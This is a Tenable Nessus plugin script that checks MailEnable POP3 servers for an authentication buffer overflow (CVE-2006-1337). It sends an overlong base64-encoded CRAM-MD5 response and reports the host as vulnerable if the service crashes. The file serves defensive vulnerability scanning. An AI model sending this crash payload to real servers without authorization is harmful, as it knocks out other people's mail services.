#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(21117);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2011/04/20 01:55:04 $");

  script_cve_id("CVE-2006-1337");
  script_bugtraq_id(17162);
  script_osvdb_id(24012);

  script_name(english:"MailEnable POP3 Server Authentication Vulnerabilities");
  script_summary(english:"Tries to crash MailEnable POP3 Server");

  script_set_attribute(attribute:"synopsis", value:
"The remote POP3 server is affected by two authentication issues." );
  script_set_attribute(attribute:"description", value:
"The remote host is running MailEnable, a commercial mail server for
Windows. 

The POP3 server bundled with the version of MailEnable on the remote
host has a buffer overflow flaw involving authentication commands that
can be exploited remotely by an unauthenticated attacker to crash the
affected service and possibly to execute code remotely. 

In addition, it reportedly has a cryptographic implementation mistake
that weakens authentication security." );
  script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2006-March/044229.html" );
  script_set_attribute(attribute:"see_also", value:"http://www.mailenable.com/hotfix/default.asp" );
  script_set_attribute(attribute:"solution", value:
"Apply the ME-10011 hotfix or upgrade to MailEnable Standard Edition
1.93 / Professional Edition 1.73 / Enterprise Edition 1.21 or later" );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value: "2006/03/22");
  script_set_attribute(attribute:"vuln_publication_date", value: "2006/03/20");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:mailenable:mailenable");
  script_end_attributes();
 
  script_category(ACT_DENIAL);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");
  script_dependencies("find_service_3digits.nasl", "doublecheck_std_services.nasl");
  script_require_ports("Services/pop3", 110);

  exit(0);
}


include("misc_func.inc");
include("pop3_func.inc");


port = get_kb_item("Services/pop3");
if (!port) port = 110;
if (!get_port_state(port)) exit(0);


# Make sure banner's from MailEnable and APOP is enabled.
banner = get_pop3_banner(port:port);
if (!banner) exit(0);
if (!egrep(pattern:"^\+OK .+ MailEnable POP3 Server <.+@.+>", string:banner)) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);

s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}


# Try to exploit the flaw to crash the service.
c = "AUTH CRAM-MD5";
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
if (strlen(s) && s =~ "^\+ ")
{
  c = string(crap(data:"A", length:400), "@", get_host_name(), " AAAAAAAAAAAAAAAAAAAAA");
  c = base64(str:c);
  send(socket:soc, data:string(c, "\r\n"));
  s = recv_line(socket:soc, length:1024);
  close(soc);

  if (!strlen(s)) {
    sleep(5);

    # Try to reestablish a connection and read the banner.
    soc2 = open_sock_tcp(port);
    if (soc2) s2 = recv_line(socket:soc2, length:1024);

    # If we couldn't establish the connection or read the banner,
    # there's a problem.
    if (!soc2 || !strlen(s2)) {
      security_hole(port);
      exit(0);
    }
    close(soc2);
  }
}
